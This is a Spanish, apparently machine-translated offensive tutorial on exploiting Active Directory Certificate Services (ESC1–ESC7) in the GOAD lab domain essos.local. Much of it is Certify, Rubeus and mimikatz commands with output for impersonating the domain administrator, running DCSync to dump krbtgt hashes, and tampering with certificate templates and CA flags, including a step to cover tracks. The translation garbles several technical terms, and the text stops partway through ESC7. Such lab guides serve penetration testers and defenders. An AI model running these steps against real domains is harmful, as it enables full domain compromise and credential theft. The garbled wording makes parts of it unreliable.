

---
 [[#ESC1 (Plantillas de certificados mal configurados)]]
 [[#ESC2 (Plantillas de certificados mal configurados con EKU "Any Purpose")]]
 [[#ESC3 (Plantillas de "Enrollment Agent")]]
 [[#ESC4 (Vulnerable Certificate Template Access Control)]]
 [[#ESC5 Vulnerable PKI Object Access Control]]
 [[#ESC6 EDITF-ATTRIBUTESUBJECTALTTME2]]
 [[#ESC7 Control de acceso de la Autoridad de Certificados Vulnerables]]
 [[#ESC8 NTLM Relay a AD CS HTTP Puntos finales]]
 [[#ESC9 No hay prórroga de la seguridad]]
 [[#ESC10 Cartografías débiles de certificados]]
 [[#ESC11 IF-ENFORCEENCPTICERTREQUEST]]
 [[#ESC12 Acceso SHELL a CA Server]]
 [[#ESC13 Enlaces de grupo OID de la política de emisión]]
 [[#ESC14 Credenciales SHADOW y mapeo de certificados avanzados]]
 [[#ESC15 Versión 1 Políticas de Aplicación de la Plantilla (CVE-2024-49019)]]
 [[#ESC16 La eliminación de la extensión de seguridad CA-Wide]]
 
---

Antes de empezar a romper las cosas, vamos a entender lo que hace ADCS diferente de otros servicios de Windows que está acostumbrado a atacar. ADCS implementa una Infraestructura de Clave Pública (ICP) que típicamente sigue esta jerarquía:

```none
Root CA (Offline)
    └── Subordinate CA (Online)
        └── Certificate Templates
            └── Issued Certificates
```

Veamos cómo se ve esto en nuestro entorno GOAD:

```bash
# Discover ADCS servers in the environment
nxc ldap 192.168.56.10-23 -u '' -p '' -M adcs

SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
LDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\guest: 
ADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local
ADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local

SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
LDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\guest: 
ADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local
ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
```

Los componentes clave explotaremos:

- **Autoridad de Certificados (CA**): Edicciona y gestiona certificados
- **Plantillas de certificado:** Definir qué certificados se pueden solicitar y por quién
- **Tienda de certificados:** Cuando los certificados se almacenan en máquinas
- **Auto-inscripción** : Inscripción automática de certificados para objetos de dominio

### Fundamentos de la plantilla de certificado

Las plantillas de certificados son el núcleo de los ataques de ADCS. Definen:

- Quién puede solicitar certificados (permisos de inscripción)
- Para qué se puede utilizar el certificado (Uso de llave mejorada)
- Si el nombre del sujeto puede ser especificado por el solicitante
- Requisitos de autenticación para la inscripción

Esto es lo que hace que las plantillas sean peligrosas - a menudo permiten mucho más acceso de lo que los administradores se dan cuenta. Veamos lo que encontramos en GOAD, y enumeramos plantillas de certificados con Certify: `Certify.exe find /vulnerable`comando. Esto nos muestra varias plantillas vulnerables en el entorno GOAD. Ahora vamos a sumergirnos en explotarlos.


---


# ESC1 (Plantillas de certificados mal configurados)

ESC1 es el ataque ADCS más directo, y honestamente, es mi favorito porque es tan confiable. Explota plantillas de certificados que permiten a los atacantes especificar Nombres Alternativos de Sujeto arbitrarios (SAN).

### Detalles técnicos

La vulnerabilidad ocurre cuando una plantilla de certificado tiene:

1. La bandera de **CT-FLAG-ENROLLEE-SUPPLIES-SUBJECT** ha permitido
2. **Aventura del cliente** o **cualquier propósito** EKU
3. **Permisos de** inscripción de **usuarios** de **dominio**
4. No se requiere **aprobación de gerente**

Cuando todas estas condiciones se alinean, puede solicitar un certificado para cualquier usuario en el dominio. Es así de simple.

### Proceso de explotación

Primero, en enumeramos plantillas vulnerables en nuestro laboratorio GOAD. Uso de Certify para encontrar vulnerabilidades ESC1:

```bash
Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject

[*] Action: Find certificate templates
[*] Using current user's unrolled group SID list for cross-references
[*] Current user context       : ESSOS\missandei
[*] Using the search base 'CN=Configuration,DC=essos,DC=local'


[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC1
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
        Enrollment Rights           : ESSOS\Domain Computers                Access: Allow
      Object Control Permissions  : ESSOS\missandei                      Access: Allow

[*] CA Response             : The certificate has been issued.

  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)
```

Perfecto. Esta salida confirma `ESSOS\Domain Users`(que `missandei`es un miembro de) tiene derechos de inscripción en la plantilla "ESC1", y la plantilla permite a un inscriptible suministrar el tema. _Nota: El producto también indica `missandei`tiene "Permisos de Control de Objetos" sobre esta plantilla específica, lo que además la haría vulnerable a ESC4 por su parte. Para el CES1, nos centramos principalmente en los derechos de matriculación._

Perfecto. Ahora vamos a solicitar un certificado para el administrador de dominios. Solicitar certificado por hacerse pasar por Domain Admin:

**Importante:** Para la exactitud y para evitar problemas de desajuste de certificados, siempre debemos aspirar a proporcionar la `/sid`parámetro que debe ser el SID del usuario al que estamos apuntando (administrador en este caso).

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] No subject name specified, using current context as subject.

[*] Template                : ESC1
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : essos\administrator

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA

[*] CA Response             : The certificate has been issued.
[*] Request ID              : 7

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Ahora vamos a convertir al formato PFX para su uso con Rubeus. Hay dos métodos:

**Método 1: Uso de OpenSSL (cross-platform)**

```bash
openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx
```

**Método 2: Usando certutil (nativa de las ventanas)**

```bash
# Save the private key and certificate to separate files
# cert.key (from -----BEGIN RSA PRIVATE KEY----- to -----END RSA PRIVATE KEY-----)
# cert.pem (from -----BEGIN CERTIFICATE----- to -----END CERTIFICATE-----)

# Then merge them with certutil
certutil -MergePFX .\cert.pem .\administrator.pfx
```

Utilice Rubeus para solicitar el hash NTLM directamente o obtener una Kerberos TGT:

```bash
# Get NTLM Hash directly
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials

# Or get TGT (traditional method)
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'essos.local\administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ8bDUVTU09TLkxPQ0FM
      ...base64 encoded ticket...

[*] Action: Describe Ticket

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 10:30:15 AM
  EndTime                  : 1/3/2025 8:30:15 PM
  RenewTill                : 1/10/2025 10:30:15 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)
```

Perfecto. Ahora podemos usar la TGT para realizar DCSync:

```bash
Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

# Now perform DCSync as administrator
mimikatz.exe "lsadump::dcsync /domain:essos.local /user:krbtgt"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:essos.local /user:krbtgt
[DC] 'essos.local' will be the domain
[DC] 'meereen.essos.local' will be the DC server
[DC] 'krbtgt' will be the DSRM user

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 1/15/2023 2:14:32 PM
Object Security ID   : S-1-5-21-1394808576-3393508183-1134699666-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9
    ntlm- 0: a577fcf16cfef780a2ceb343ec39a0d9
    lm  - 0: 367ac3b3d1f4d80b8f52a7b6e8c1d2e9
```

Excelente. Hemos escalado con éxito de un usuario de dominio (`missandei`) al administrador de dominios utilizando ESC1.

**Mejoras clave para los ataques ESC1:**

- Uso `/sid`parámetro para la exactitud y para evitar problemas de desajuste certificado
- `/getcredentials`bandera extrae hachís NTLM directamente sin necesidad de TGT
- `certutil -MergePFX`ofrece conversión de certificado nativa de Windows
- Lista más específica con `/enabled /enrolleeSuppliesSubject`banderas

### Técnicas avanzadas ESC1

Para la evasión y la fiabilidad, considere estos enfoques avanzados utilizando el entorno GOAD:

```csharp
// Custom C# implementation for certificate requests
using System.Security.Cryptography.X509Certificates;
using System.Text;
using CERTENROLLLib;

public class CertificateRequestor
{
    public string RequestCertificate(string caConfig, string template, string altName)
    {
        // Create certificate request
        var request = new CX509CertificateRequestPkcs10();
        var privateKey = new CX509PrivateKey();
        var csp = new CCspInformation();
        
        // Configure private key
        privateKey.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider";
        privateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;
        privateKey.Length = 2048;
        privateKey.Create();
        
        // Build certificate request for GOAD environment
        request.InitializeFromPrivateKey(
            X509CertificateEnrollmentContext.ContextUser,
            privateKey,
            template);
            
        // Add SAN extension for administrator@essos.local
        var sanExtension = new CX509ExtensionAlternativeNames();
        var altNames = new CAlternativeNames();
        var altNameObj = new CAlternativeName();
        
        altNameObj.InitializeFromString(
            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
            altName);
        altNames.Add(altNameObj);
        
        sanExtension.InitializeEncode(altNames);
        request.X509Extensions.Add(sanExtension);
        
        // Submit request
        var enroll = new CX509Enrollment();
        enroll.InitializeFromRequest(request);
        enroll.CertificateFriendlyName = "ESC1 Certificate";
        
        return enroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);
    }
}
```


# ESC2 (Plantillas de certificados mal configurados con EKU "Any Purpose")

ESC2 apunta a plantillas con el uso de llave extendida "Any Purpose", lo que esencialmente significa que el certificado se puede utilizar para cualquier cosa.

### Condiciones de vulnerabilidad

- La plantilla de certificado tiene **Any Purpose EKU** (OID: 2.5.29.37.0)
- **Usuarios** de **Dominio** tienen derechos de inscripción
- No se requiere **aprobación de gerente**

**Nota importante:** ESC2 por sí sola no permite la suplantación directa de otros usuarios como ESC1. Un certificado Any Purpose se vuelve verdaderamente peligroso sólo cuando la CA o plantilla también permite la inyección SAN/SID (ESC 6/9/10). En un controlador de dominio totalmente parcheado con una aplicación de asignación de certificados fuertes (siguiendo parches KB5014754 de mayo de 2022, con fases de aplicación completas que se extienden hasta principios de 2025), un certificado Any-Purpose por sí solo no evitará una cartografía de certificados fuerte.

### Explotación

Marquemos las plantillas ESC2 en GOAD:

```bash
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC2
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Any Purpose
    msPKI-Application-Policies    : Any Purpose
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
```

En la vainilla GOAD, la plantilla ESC2 se clona desde la plantilla de Usuario incorporada y mantiene sólo Any-Purpose EKU (no bandera ENROLEE-SUPPLIES-SUBJECT). Si tu laboratorio muestra la bandera, eso es ESC1. AnyPurpose combinado.

Ahora solicita el certificado con Any Purpose EKU (como usted mismo)

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC2

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC2
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 8

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----
```

Certificado de uso para la autenticación del cliente (como usuario solicitante)

```bash
Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!
```

Any Purpose EKU todavía puede ser peligroso ya que elude muchas comprobaciones de validación de certificados y puede ser utilizado para la firma de código, la autenticación del servidor y otros fines más allá de la caja de uso prevista.



# ESC3 (Plantillas de "Enrollment Agent")


ESC3 es una técnica realmente genial que explota plantillas de certificados que otorgan permisos de Certificate Request Agent (Enrollment Agent). Básicamente, puede solicitar certificados en nombre de otros usuarios una vez que obtenga un certificado de agente.

### Flow de ataque

El ataque es bastante sencillo:

1. Solicitar certificado de agente de inscripción
2. Utilice ese certificado de agente para solicitar certificados para otros usuarios
3. Autentican como esos usuarios

### Aplicación

Veamos esto en acción con nuestro entorno GOAD:

Paso 1: Solicitud de certificado de agente de inscripción La plantilla incorporada se llama "EnrollmentAgent" - clonarlo a ESC3-CRA para su laboratorio si es necesario

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:EnrollmentAgent

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : EnrollmentAgent
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 9

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz
...enrollment agent certificate...
-----END CERTIFICATE-----
```

Paso 2: Utilice certificado de agente para solicitar certificado para Domain Admin

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz

[*] Action: Request a Certificates on behalf of another user
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] On behalf of            : ESSOS\administrator
[*] Agent Certificate       : agent.pfx

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 10

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
...administrator certificate...
-----END CERTIFICATE-----
```

Paso 3: Authentica como administrador

```bash
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  StartTime                : 1/3/2025 11:15:23 AM
  EndTime                  : 1/3/2025 9:15:23 PM
  RenewTill                : 1/10/2025 11:15:23 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
```

Perfecto. Hemos escalado de `khal.drogo`a `administrator`utilizando la técnica ESC3.

# ESC4 (Vulnerable Certificate Template Access Control)

ESC4 es una de mis técnicas favoritas porque es furtiva. En lugar de explotar las plantillas vulnerables existentes, modificas una plantilla segura para que sea vulnerable, la explotas, luego limpias tus huellas.

### Estrategia de explotación

Así es como funciona el ataque:

1. Encuentre plantillas donde tenga permisos peligrosos (WriteProperty o WriteOwner)
2. Modificar la plantilla para hacerla vulnerable a ESC1
3. Explotar la plantilla recién vulnerable
4. Limpie sus modificaciones para cubrir sus huellas

### Aplicación práctica

Veamos qué podemos modificar en GOAD. Encuentre plantillas con ACLs vulnerables:

```bash
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC4
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
      Object Control Permissions
        Owner                       : ESSOS\Administrator
        WriteProperty Principals    : ESSOS\khal.drogo                     Access: Allow
        WriteDacl Principals        : ESSOS\Administrator

# First, backup original template settings for cleanup
Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties * | Select-Object * | Export-Clixml ESC4-backup.xml

# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}

[*] Template ESC4 modified to enable ENROLLEE_SUPPLIES_SUBJECT

# Wait for AD replication
Start-Sleep -Seconds 30

# Request certificate with arbitrary SAN
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : ESC4
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 11

# Authenticate as administrator
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[+] TGT request successful!

# Restore original template (cleanup)
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}

[*] Template ESC4 restored to original configuration
```

### Modificación de la plantilla de PowerShell

Aquí hay un script más robusto para la modificación de plantillas en GOAD:

```bash
function Modify-CertificateTemplate {
    param(
        [string]$TemplateName,
        [switch]$EnableSubjectAltName,
        [switch]$Restore,
        [string]$Domain = "essos.local"
    )
    
    $configPath = "CN=Configuration," + (Get-ADDomain -Identity $Domain).DistinguishedName
    $templatePath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath"
    
    try {
        $template = Get-ADObject $templatePath -Properties "msPKI-Certificate-Name-Flag"
        
        if ($Restore) {
            # Restore to secure setting
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
            Write-Host "[+] Template $TemplateName restored to secure configuration"
        } else {
            # Enable ENROLLEE_SUPPLIES_SUBJECT
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
            Write-Host "[+] Template $TemplateName modified to enable subject specification"
        }
        
        # Wait for AD replication
        Write-Host "[*] Waiting for AD replication..."
        Start-Sleep -Seconds 30
        
    } catch {
        Write-Error "Failed to modify template: $($_.Exception.Message)"
    }
}

# Usage in GOAD environment
Modify-CertificateTemplate -TemplateName "ESC4" -EnableSubjectAltName -Domain "essos.local"
# ... perform attack ...
Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
```


# ESC5: Vulnerable PKI Object Access Control

ESC5 explota permisos débiles en los propios objetos PKI, incluyendo el servidor CA y plantillas de certificados contenedor.

### Vectores de ataque

1. **CA Server Object** : El permiso de WriteProperty permite cambios de configuración
2. **Contenedor de plantillas de certificados:** GenericWrite permite la creación de plantillas
3. **Objetos individuales de CA:** Diversos permisos peligrosos

Examinemos lo que tenemos en GOAD. Compruebe los permisos de los objetos de CA en dominio essos.local:

```bash
Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor

DistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name              : ESSOS-CA
ObjectClass       : pKIEnrollmentService
ObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4

# In GOAD, khal.drogo has interesting permissions on the CA
```

### Modificación de la configuración de CA

Si tienes EscribirMuydes, modifica la configuración de CA. Habilitar a SAN en los certificados expedidos:

```bash
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
The command completed successfully.
```

Reinician servicios de certificado para aplicar cambios

```bash
net stop certsvc && net start certsvc

The Certificate Services service is stopping.
The Certificate Services service was stopped successfully.
The Certificate Services service is starting.
The Certificate Services service was started successfully.

# Wait for services to fully restart
Start-Sleep -Seconds 10
```

Ahora podemos solicitar el certificado con SAN de cualquier plantilla:

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 12
```

### Creación de la Plantación de Certificado

Si tiene GenericWrite en el contenedor de Plantillas de Certificado en GOAD, cree una nueva plantilla vulnerable:

```bash
$templateDN = "CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"

# Template with dangerous settings for GOAD environment
New-ADObject -Name "EvilTemplate" -Type "pKICertificateTemplate" -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -OtherAttributes @{
    'flags' = 131680
    'msPKI-Certificate-Name-Flag' = 1
    'msPKI-Enrollment-Flag' = 41
    'msPKI-Minimal-Key-Size' = 2048
    'msPKI-Private-Key-Flag' = 16842752
    'msPKI-Template-Schema-Version' = 2
    'pKIDefaultKeySpec' = 1
    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0xA4,0xE8,0x65,0xFA,0xFF))
    'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')
    'pKIKeyUsage' = ([byte[]](0x80,0x00))
    'pKIOverlapPeriod' = ([byte[]](0x00,0x80,0xA6,0x0A,0xFF,0xDE,0xFF,0xFF))
    'revision' = 100
}

ObjectGUID                : 8f3e2a1b-9c4d-4e5f-a6b7-c8d9e0f1a2b3
DistinguishedName         : CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name                      : EvilTemplate
ObjectClass               : pKICertificateTemplate

# Template created successfully and ready for exploitation
```

# ESC6: EDITF-ATTRIBUTESUBJECTALTTME2

ESC6 explota la `EDITF_ATTRIBUTESUBJECTALTNAME2`bandera en la CA, que permite la especificación SAN en cualquier solicitud de certificado.

_Para obtener información detallada sobre esta vulnerabilidad y pasos de remediación, consulte [el](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting) artículo ["Edit vulnerable Certificate Authority Setting (ESC6) de](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting) Microsoft [Learn".](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting)_

### Vulnerability Cómo llegar

Revisemos la configuración de GOAD CA. Compruebe si la bandera está habilitada en ESSOS-CA:

```bash
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x144120 (1327392)

EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
EDITF_ATTRIBUTEENDDATE -- 20000 (131072)
EDITF_ATTRIBUTECA -- 4000 (16384)
EDITF_IGNOREREQUESTERGROUP -- 100000 (1048576)
CertUtil: -getreg command completed successfully.

# Flag 0x40000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is present!
```

### Explotación

**Nota:** Desde el endurecimiento de Microsoft lanzado en KB5014754 (10 de mayo de 2022), los certificados emitidos a través de un CA que todavía tiene habilitado EDITF-ATTRIBUTESBJECTALTTM02 deben contener la nueva extensión de seguridad SID o confiar en modos de asignación débiles; de lo contrario se niegan el inicio de sesión. Por lo tanto, la explotación del CES6 exige comúnmente también las condiciones del CES9 o del CES10.

Encuentre CAs con el conjunto de banderas EDITF-ATTRIBUTESUBJECTALTNAME2:

```bash
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :
[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!

    Enterprise CA Name            : ESSOS-CA
    DNS Hostname                  : braavos.essos.local
    FullName                      : braavos.essos.local\ESSOS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
    UserSpecifiedSAN              : Enabled (ESC6)
```

Solicitar certificado con SAN arbitrario utilizando cualquier plantilla:

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 13
```

Aunque la plantilla no permite la especificación del sujeto, ESC6 lo permite a través de la configuración de CA

### Habilitar la Bandera (si tienes derechos de administración de CA). Habilitar la peligrosa bandera de GOAD CA:

```bash
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
```

Servicios de certificación de reinicio:

```bash
Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services
```

# ESC7: Control de acceso de la Autoridad de Certificados Vulnerables

ESC7 se trata de tener acceso directo a la propia CA. Si puede obtener ManageCA o ManageCerttificates permisos, básicamente es dueño de toda la infraestructura de certificados.

Veamos qué permisos tenemos en GOAD. Compruebe si tenemos derechos de ManageCA:

```bash
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Permissions
      Owner                       : BUILTIN\Administrators        Access: GenericAll
      Access Rights               : ESSOS\Domain Admins           Access: GenericAll
